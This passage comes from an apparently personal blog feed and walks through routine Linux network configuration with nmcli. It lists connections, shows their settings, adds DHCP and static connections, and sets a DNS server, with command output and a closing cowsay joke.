<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con show
</span><span class='line'>NAME                UUID                                  TYPE            DEVICE 
</span><span class='line'>Wired connection 1  8d922966-5be4-4633-a99d-71e836e2b31a  802-3-ethernet  enp0s3 
</span><span class='line'>virbr0              321062a9-495a-4095-b4b5-d1af9c0cc65c  bridge          virbr0 
</span><span class='line'>enp0s3              b4c32cc7-c5ff-451c-8af2-9b9124050f99  802-3-ethernet  --  
</span><span class='line'>nmcli con show --active
</span><span class='line'>NAME                UUID                                  TYPE            DEVICE 
</span><span class='line'>Wired connection 1  8d922966-5be4-4633-a99d-71e836e2b31a  802-3-ethernet  enp0s3 
</span><span class='line'>virbr0              321062a9-495a-4095-b4b5-d1af9c0cc65c  bridge          virbr0 </span></code></pre></td></tr></table></div></figure>


<ul>
<li>list the settings of a particular connection (the double quotes aren&rsquo;t mandatory)</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con show "Wired connection 1" 
</span><span class='line'>connection.id:                          Wired connection 1
</span><span class='line'>connection.uuid:                        8d922966-5be4-4633-a99d-71e836e2b31a
</span><span class='line'>connection.stable-id:                   --
</span><span class='line'>connection.interface-name:              --
</span><span class='line'>connection.type:                        802-3-ethernet
</span><span class='line'>connection.autoconnect:                 yes
</span><span class='line'>connection.autoconnect-priority:        0
</span><span class='line'>connection.timestamp:                   1515583502
</span><span class='line'>connection.read-only:                   no
</span><span class='line'>connection.permissions:                 
</span><span class='line'>connection.zone:                        --
</span><span class='line'>connection.master:                      --
</span><span class='line'>connection.slave-type:                  --
</span><span class='line'>connection.autoconnect-slaves:          -1 (default)
</span><span class='line'>connection.secondaries:                 
</span><span class='line'>connection.gateway-ping-timeout:        0
</span><span class='line'>connection.metered:                     unknown
</span><span class='line'>connection.lldp:                        -1 (default)
</span><span class='line'>802-3-ethernet.port:                    --
</span><span class='line'>802-3-ethernet.speed:                   0
</span><span class='line'>802-3-ethernet.duplex:                  --
</span><span class='line'>802-3-ethernet.auto-negotiate:          yes
</span><span class='line'>802-3-ethernet.mac-address:             00:0C:29:47:D7:A8
</span><span class='line'>802-3-ethernet.cloned-mac-address:      --
</span><span class='line'>802-3-ethernet.generate-mac-address-mask:--
</span><span class='line'>802-3-ethernet.mac-address-blacklist:   
</span><span class='line'>802-3-ethernet.mtu:                     auto
</span><span class='line'>802-3-ethernet.s390-subchannels:        
</span><span class='line'>802-3-ethernet.s390-nettype:            --
</span><span class='line'>802-3-ethernet.s390-options:            
</span><span class='line'>802-3-ethernet.wake-on-lan:             1 (default)
</span><span class='line'>802-3-ethernet.wake-on-lan-password:    --
</span><span class='line'>ipv4.method:                            auto
</span><span class='line'>ipv4.dns:                               8.8.8.8
</span><span class='line'>ipv4.dns-search:                        
</span><span class='line'>ipv4.dns-options:                       (default)
</span><span class='line'>ipv4.dns-priority:                      0
</span><span class='line'>ipv4.addresses:                         
</span><span class='line'>ipv4.gateway:                           --
</span><span class='line'>ipv4.routes:                            
</span><span class='line'>ipv4.route-metric:                      -1
</span><span class='line'>ipv4.ignore-auto-routes:                no
</span><span class='line'>ipv4.ignore-auto-dns:                   no
</span><span class='line'>ipv4.dhcp-client-id:                    --
</span><span class='line'>ipv4.dhcp-timeout:                      0
</span><span class='line'>ipv4.dhcp-send-hostname:                yes
</span><span class='line'>ipv4.dhcp-hostname:                     --
</span><span class='line'>ipv4.dhcp-fqdn:                         --
</span><span class='line'>ipv4.never-default:                     no
</span><span class='line'>ipv4.may-fail:                          yes
</span><span class='line'>ipv4.dad-timeout:                       -1 (default)
</span><span class='line'>ipv6.method:                            auto
</span><span class='line'>ipv6.dns:                               
</span><span class='line'>ipv6.dns-search:                        
</span><span class='line'>ipv6.dns-options:                       (default)
</span><span class='line'>ipv6.dns-priority:                      0
</span><span class='line'>ipv6.addresses:                         
</span><span class='line'>ipv6.gateway:                           --
</span><span class='line'>ipv6.routes:                            
</span><span class='line'>ipv6.route-metric:                      -1
</span><span class='line'>ipv6.ignore-auto-routes:                no
</span><span class='line'>ipv6.ignore-auto-dns:                   no
</span><span class='line'>ipv6.never-default:                     no
</span><span class='line'>ipv6.may-fail:                          yes
</span><span class='line'>ipv6.ip6-privacy:                       -1 (unknown)
</span><span class='line'>ipv6.addr-gen-mode:                     stable-privacy
</span><span class='line'>ipv6.dhcp-send-hostname:                yes
</span><span class='line'>ipv6.dhcp-hostname:                     --
</span><span class='line'>ipv6.token:                             --
</span><span class='line'>GENERAL.NAME:                           Wired connection 1
</span><span class='line'>GENERAL.UUID:                           8d922966-5be4-4633-a99d-71e836e2b31a
</span><span class='line'>GENERAL.DEVICES:                        enp0s3
</span><span class='line'>GENERAL.STATE:                          activated
</span><span class='line'>GENERAL.DEFAULT:                        yes
</span><span class='line'>GENERAL.DEFAULT6:                       no
</span><span class='line'>GENERAL.VPN:                            no
</span><span class='line'>GENERAL.ZONE:                           --
</span><span class='line'>GENERAL.DBUS-PATH:                      /org/freedesktop/NetworkManager/ActiveConnection/0
</span><span class='line'>GENERAL.CON-PATH:                       /org/freedesktop/NetworkManager/Settings/0
</span><span class='line'>GENERAL.SPEC-OBJECT:                    /
</span><span class='line'>GENERAL.MASTER-PATH:                    --
</span><span class='line'>IP4.ADDRESS[1]:                         192.168.241.130/24
</span><span class='line'>IP4.GATEWAY:                            192.168.241.2
</span><span class='line'>IP4.DNS[1]:                             192.168.241.2
</span><span class='line'>IP4.DNS[2]:                             8.8.8.8
</span><span class='line'>IP4.DOMAIN[1]:                          localdomain
</span><span class='line'>DHCP4.OPTION[1]:                        requested_routers = 1
</span><span class='line'>DHCP4.OPTION[2]:                        requested_domain_search = 1
</span><span class='line'>DHCP4.OPTION[3]:                        requested_time_offset = 1
</span><span class='line'>DHCP4.OPTION[4]:                        requested_domain_name = 1
</span><span class='line'>DHCP4.OPTION[5]:                        requested_rfc3442_classless_static_routes = 1
</span><span class='line'>DHCP4.OPTION[6]:                        requested_classless_static_routes = 1
</span><span class='line'>DHCP4.OPTION[7]:                        requested_wpad = 1
</span><span class='line'>DHCP4.OPTION[8]:                        requested_broadcast_address = 1
</span><span class='line'>DHCP4.OPTION[9]:                        next_server = 192.168.241.254
</span><span class='line'>DHCP4.OPTION[10]:                       expiry = 1515584826
</span><span class='line'>DHCP4.OPTION[11]:                       requested_interface_mtu = 1
</span><span class='line'>DHCP4.OPTION[12]:                       requested_subnet_mask = 1
</span><span class='line'>DHCP4.OPTION[13]:                       domain_name = localdomain
</span><span class='line'>DHCP4.OPTION[14]:                       dhcp_message_type = 5
</span><span class='line'>DHCP4.OPTION[15]:                       ip_address = 192.168.241.130
</span><span class='line'>DHCP4.OPTION[16]:                       routers = 192.168.241.2
</span><span class='line'>DHCP4.OPTION[17]:                       requested_static_routes = 1
</span><span class='line'>DHCP4.OPTION[18]:                       subnet_mask = 255.255.255.0
</span><span class='line'>DHCP4.OPTION[19]:                       requested_domain_name_servers = 1
</span><span class='line'>DHCP4.OPTION[20]:                       requested_nis_servers = 1
</span><span class='line'>DHCP4.OPTION[21]:                       requested_ntp_servers = 1
</span><span class='line'>DHCP4.OPTION[22]:                       domain_name_servers = 192.168.241.2
</span><span class='line'>DHCP4.OPTION[23]:                       dhcp_lease_time = 1800
</span><span class='line'>DHCP4.OPTION[24]:                       requested_ms_classless_static_routes = 1
</span><span class='line'>DHCP4.OPTION[25]:                       broadcast_address = 192.168.241.255
</span><span class='line'>DHCP4.OPTION[26]:                       requested_nis_domain = 1
</span><span class='line'>DHCP4.OPTION[27]:                       network_number = 192.168.241.0
</span><span class='line'>DHCP4.OPTION[28]:                       requested_host_name = 1
</span><span class='line'>DHCP4.OPTION[29]:                       dhcp_server_identifier = 192.168.241.254
</span><span class='line'>IP6.ADDRESS[1]:                         fe80::d7e8:7b48:831f:a1de/64
</span><span class='line'>IP6.GATEWAY:                            </span></code></pre></td></tr></table></div></figure>


<ul>
<li>adding connections</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con add help
</span><span class='line'>Usage: nmcli connection add { ARGUMENTS | help }
</span><span class='line'>
</span><span class='line'>ARGUMENTS := COMMON_OPTIONS TYPE_SPECIFIC_OPTIONS SLAVE_OPTIONS IP_OPTIONS [-- ([+|-]&lt;setting&gt;.&lt;property&gt; &lt;value&gt;)+]
</span><span class='line'>
</span><span class='line'>  COMMON_OPTIONS:
</span><span class='line'>                  type &lt;type&gt;
</span><span class='line'>                  ifname &lt;interface name&gt; | "*"
</span><span class='line'>                  [con-name &lt;connection name&gt;]
</span><span class='line'>                  [autoconnect yes|no]
</span><span class='line'>                  [save yes|no]
</span><span class='line'>                  [master &lt;master (ifname, or connection UUID or name)&gt;]
</span><span class='line'>                  [slave-type &lt;master connection type&gt;]
</span><span class='line'>
</span><span class='line'>  TYPE_SPECIFIC_OPTIONS:
</span><span class='line'>    ethernet:     [mac &lt;MAC address&gt;]
</span><span class='line'>                  [cloned-mac &lt;cloned MAC address&gt;]
</span><span class='line'>                  [mtu &lt;MTU&gt;]
</span><span class='line'>
</span><span class='line'>    wifi:         ssid &lt;SSID&gt;
</span><span class='line'>                  [mac &lt;MAC address&gt;]
</span><span class='line'>                  [cloned-mac &lt;cloned MAC address&gt;]
</span><span class='line'>                  [mtu &lt;MTU&gt;]
</span><span class='line'>                  [mode infrastructure|ap|adhoc]
</span><span class='line'>
</span><span class='line'>    wimax:        [mac &lt;MAC address&gt;]
</span><span class='line'>                  [nsp &lt;NSP&gt;]
</span><span class='line'>
</span><span class='line'>    pppoe:        username &lt;PPPoE username&gt;
</span><span class='line'>                  [password &lt;PPPoE password&gt;]
</span><span class='line'>                  [service &lt;PPPoE service name&gt;]
</span><span class='line'>                  [mtu &lt;MTU&gt;]
</span><span class='line'>                  [mac &lt;MAC address&gt;]
</span><span class='line'>
</span><span class='line'>    gsm:          apn &lt;APN&gt;
</span><span class='line'>                  [user &lt;username&gt;]
</span><span class='line'>                  [password &lt;password&gt;]
</span><span class='line'>
</span><span class='line'>    cdma:         [user &lt;username&gt;]
</span><span class='line'>                  [password &lt;password&gt;]
</span><span class='line'>
</span><span class='line'>    infiniband:   [mac &lt;MAC address&gt;]
</span><span class='line'>                  [mtu &lt;MTU&gt;]
</span><span class='line'>                  [transport-mode datagram | connected]
</span><span class='line'>                  [parent &lt;ifname&gt;]
</span><span class='line'>                  [p-key &lt;IPoIB P_Key&gt;]
</span><span class='line'>
</span><span class='line'>    bluetooth:    [addr &lt;bluetooth address&gt;]
</span><span class='line'>                  [bt-type panu|dun-gsm|dun-cdma]
</span><span class='line'>
</span><span class='line'>    vlan:         dev &lt;parent device (connection UUID, ifname, or MAC)&gt;
</span><span class='line'>                  id &lt;VLAN ID&gt;
</span><span class='line'>                  [flags &lt;VLAN flags&gt;]
</span><span class='line'>                  [ingress &lt;ingress priority mapping&gt;]
</span><span class='line'>                  [egress &lt;egress priority mapping&gt;]
</span><span class='line'>                  [mtu &lt;MTU&gt;]
</span><span class='line'>
</span><span class='line'>    bond:         [mode balance-rr (0) | active-backup (1) | balance-xor (2) | broadcast (3) |
</span><span class='line'>                        802.3ad    (4) | balance-tlb   (5) | balance-alb (6)]
</span><span class='line'>                  [primary &lt;ifname&gt;]
</span><span class='line'>                  [miimon &lt;num&gt;]
</span><span class='line'>                  [downdelay &lt;num&gt;]
</span><span class='line'>                  [updelay &lt;num&gt;]
</span><span class='line'>                  [arp-interval &lt;num&gt;]
</span><span class='line'>                  [arp-ip-target &lt;num&gt;]
</span><span class='line'>                  [lacp-rate slow (0) | fast (1)]
</span><span class='line'>
</span><span class='line'>    bond-slave:   master &lt;master (ifname, or connection UUID or name)&gt;
</span><span class='line'>
</span><span class='line'>    team:         [config &lt;file&gt;|&lt;raw JSON data&gt;]
</span><span class='line'>
</span><span class='line'>    team-slave:   master &lt;master (ifname, or connection UUID or name)&gt;
</span><span class='line'>                  [config &lt;file&gt;|&lt;raw JSON data&gt;]
</span><span class='line'>
</span><span class='line'>    bridge:       [stp yes|no]
</span><span class='line'>                  [priority &lt;num&gt;]
</span><span class='line'>                  [forward-delay &lt;2-30&gt;]
</span><span class='line'>                  [hello-time &lt;1-10&gt;]
</span><span class='line'>                  [max-age &lt;6-40&gt;]
</span><span class='line'>                  [ageing-time &lt;0-1000000&gt;]
</span><span class='line'>                  [multicast-snooping yes|no]
</span><span class='line'>                  [mac &lt;MAC address&gt;]
</span><span class='line'>
</span><span class='line'>    bridge-slave: master &lt;master (ifname, or connection UUID or name)&gt;
</span><span class='line'>                  [priority &lt;0-63&gt;]
</span><span class='line'>                  [path-cost &lt;1-65535&gt;]
</span><span class='line'>                  [hairpin yes|no]
</span><span class='line'>
</span><span class='line'>    vpn:          vpn-type vpnc|openvpn|pptp|openconnect|openswan|libreswan|ssh|l2tp|iodine|...
</span><span class='line'>                  [user &lt;username&gt;]
</span><span class='line'>
</span><span class='line'>    olpc-mesh:    ssid &lt;SSID&gt;
</span><span class='line'>                  [channel &lt;1-13&gt;]
</span><span class='line'>                  [dhcp-anycast &lt;MAC address&gt;]
</span><span class='line'>
</span><span class='line'>    adsl:         username &lt;username&gt;
</span><span class='line'>                  protocol pppoa|pppoe|ipoatm
</span><span class='line'>                  [password &lt;password&gt;]
</span><span class='line'>                  [encapsulation vcmux|llc]
</span><span class='line'>
</span><span class='line'>    tun:          mode tun|tap
</span><span class='line'>                  [owner &lt;UID&gt;]
</span><span class='line'>                  [group &lt;GID&gt;]
</span><span class='line'>                  [pi yes|no]
</span><span class='line'>                  [vnet-hdr yes|no]
</span><span class='line'>                  [multi-queue yes|no]
</span><span class='line'>
</span><span class='line'>    ip-tunnel:    mode ipip|gre|sit|isatap|vti|ip6ip6|ipip6|ip6gre|vti6
</span><span class='line'>                  remote &lt;remote endpoint IP&gt;
</span><span class='line'>                  [local &lt;local endpoint IP&gt;]
</span><span class='line'>                  [dev &lt;parent device (ifname or connection UUID)&gt;]
</span><span class='line'>
</span><span class='line'>    macvlan:      dev &lt;parent device (connection UUID, ifname, or MAC)&gt;
</span><span class='line'>                  mode vepa|bridge|private|passthru|source
</span><span class='line'>                  [tap yes|no]
</span><span class='line'>
</span><span class='line'>    vxlan:        id &lt;VXLAN ID&gt;
</span><span class='line'>                  remote &lt;IP of multicast group or remote address&gt;
</span><span class='line'>                  [local &lt;source IP&gt;]
</span><span class='line'>                  [dev &lt;parent device (ifname or connection UUID)&gt;]
</span><span class='line'>                  [source-port-min &lt;0-65535&gt;]
</span><span class='line'>                  [source-port-max &lt;0-65535&gt;]
</span><span class='line'>                  [destination-port &lt;0-65535&gt;]
</span><span class='line'>
</span><span class='line'>  SLAVE_OPTIONS:
</span><span class='line'>    bridge:       [priority &lt;0-63&gt;]
</span><span class='line'>                  [path-cost &lt;1-65535&gt;]
</span><span class='line'>                  [hairpin yes|no]
</span><span class='line'>
</span><span class='line'>    team:         [config &lt;file&gt;|&lt;raw JSON data&gt;]
</span><span class='line'>
</span><span class='line'>  IP_OPTIONS:
</span><span class='line'>                  [ip4 &lt;IPv4 address&gt;] [gw4 &lt;IPv4 gateway&gt;]
</span><span class='line'>                  [ip6 &lt;IPv6 address&gt;] [gw6 &lt;IPv6 gateway&gt;]</span></code></pre></td></tr></table></div></figure>


<ul>
<li>add a new DHCP connection that will start on boot</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con add con-name newdhcp type ethernet ifname enp0s3 
</span><span class='line'>Connection 'newdhcp' (8c90fcd7-5e40-43c6-819b-47cab3051b5e) successfully added.
</span><span class='line'>nmcli con up newdhcp 
</span><span class='line'>Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/3)
</span><span class='line'>nmcli con show --active 
</span><span class='line'>NAME     UUID                                  TYPE            DEVICE 
</span><span class='line'>newdhcp  8c90fcd7-5e40-43c6-819b-47cab3051b5e  802-3-ethernet  enp0s3 
</span><span class='line'>virbr0   321062a9-495a-4095-b4b5-d1af9c0cc65c  bridge          virbr0</span></code></pre></td></tr></table></div></figure>


<ul>
<li>add a static connection</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con add con-name static-con ifname enp0s3 autoconnect no type ethernet ip4 192.168.241.120/24 gw4 192.168.241.2
</span><span class='line'>Connection 'static-con' (258c2964-ac43-4ed8-bffa-7ad09967b748) successfully added.</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see the IP we started with:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ifconfig | grep inet
</span><span class='line'>        inet 192.168.241.130  netmask 255.255.255.0  broadcast 192.168.241.255</span></code></pre></td></tr></table></div></figure>


<p>And after switching to the static connection:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con up static-con 
</span><span class='line'>Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/4)
</span><span class='line'>nmcli con show --active 
</span><span class='line'>NAME        UUID                                  TYPE            DEVICE 
</span><span class='line'>static-con  258c2964-ac43-4ed8-bffa-7ad09967b748  802-3-ethernet  enp0s3 
</span><span class='line'>virbr0      321062a9-495a-4095-b4b5-d1af9c0cc65c  bridge          virbr0 
</span><span class='line'>ifconfig | grep inet
</span><span class='line'>        inet 192.168.241.120  netmask 255.255.255.0  broadcast 192.168.241.255</span></code></pre></td></tr></table></div></figure>


<ul>
<li>modifying connections</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con mod help
</span><span class='line'>Usage: nmcli connection modify { ARGUMENTS | help }
</span><span class='line'>
</span><span class='line'>ARGUMENTS := [id | uuid | path] &lt;ID&gt; ([+|-]&lt;setting&gt;.&lt;property&gt; &lt;value&gt;)+
</span><span class='line'>
</span><span class='line'>Modify one or more properties of the connection profile.
</span><span class='line'>The profile is identified by its name, UUID or D-Bus path. For multi-valued
</span><span class='line'>properties you can use optional '+' or '-' prefix to the property name.
</span><span class='line'>The '+' sign allows appending items instead of overwriting the whole value.
</span><span class='line'>The '-' sign allows removing selected items instead of the whole value.
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>nmcli con mod home-wifi wifi.ssid rakosnicek
</span><span class='line'>nmcli con mod em1-1 ipv4.method manual ipv4.addr "192.168.1.2/24, 10.10.1.5/8"
</span><span class='line'>nmcli con mod em1-1 +ipv4.dns 8.8.4.4
</span><span class='line'>nmcli con mod em1-1 -ipv4.dns 1
</span><span class='line'>nmcli con mod em1-1 -ipv6.addr "abbe::cafe/56"
</span><span class='line'>nmcli con mod bond0 +bond.options mii=500
</span><span class='line'>nmcli con mod bond0 -bond.options downdelay</span></code></pre></td></tr></table></div></figure>


<ul>
<li>add a DNS server to an existing connection</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con show static-con | grep ipv4.dns
</span><span class='line'>ipv4.dns:                               
</span><span class='line'>ipv4.dns-search:                        
</span><span class='line'>ipv4.dns-options:                       (default)
</span><span class='line'>ipv4.dns-priority:                      0
</span><span class='line'>nmcli con mod static-con ipv4.dns 8.8.8.8
</span><span class='line'>nmcli con up static-con
</span><span class='line'>nmcli con show static-con | grep ipv4.dns
</span><span class='line'>ipv4.dns:                               8.8.8.8
</span><span class='line'>ipv4.dns-search:                        
</span><span class='line'>ipv4.dns-options:                       (default)
</span><span class='line'>ipv4.dns-priority:                      0</span></code></pre></td></tr></table></div></figure>


<h3>Learn more</h3>

<ul>
<li><a href="https://developer.gnome.org/NetworkManager/">NetworkManager documentation</a></li>
<li><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/networking_guide/">RHEL7 networking guide</a></li>
<li><a href="https://www.certdepot.net/rhel7-get-started-nmcli/">CertDepot NetworkManager guide</a></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ____________________________________
</span><span class='line'>/ You're currently going through a   \
</span><span class='line'>| difficult transition period called |
</span><span class='line'>\ "Life."                            /
</span><span class='line'> ------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Securing SSH]]></title>
